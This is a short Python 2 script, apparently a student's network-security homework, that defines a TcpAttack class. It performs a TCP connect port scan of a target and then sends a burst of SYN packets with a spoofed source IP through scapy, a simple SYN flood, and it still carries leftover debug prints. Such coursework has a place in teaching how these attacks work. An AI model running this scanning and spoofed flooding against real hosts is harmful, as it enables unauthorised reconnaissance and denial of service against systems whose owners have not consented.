#! /usr/bin/env python
# name: Yinuo Li
# hw08
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import socket
from scapy.all import *



class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
        fo = open("openports.txt", "w")
        targetIP = socket.gethostbyname(self.targetIP)
        spoofIP = socket.gethostbyname(self.spoofIP)
        for port in range(rangeStart, rangeEnd+1):
            #print (port)
            #print "lllll"
            #create a temp socket
            ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # set the timeout to be 0.01 second
            ts.settimeout(0.01)
            #check if the port is open
            error = ts.connect_ex((targetIP, port))
            # check the error return
            if error == 0:
                open_port = "Open port found: "+str(port)+"\n"
                fo.write(open_port)
                ts.close()
            else:
                print "Port "+str(port)+" is closed."
        fo.close()


    def attackTarget(self, port):
        ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ts.settimeout(0.01)
        targetIP = socket.gethostbyname(self.targetIP)
        error = ts.connect_ex((targetIP, port))
        print "uuuu"
        if error == 0:
            print "zero"
            temp = IP(src=self.spoofIP, dst=self.targetIP)/TCP(dport=port, flags='S')
            for i in range(0,12):
                send(temp)
                print (i)
            return 1
        else:
            print "not conn"
            return 0
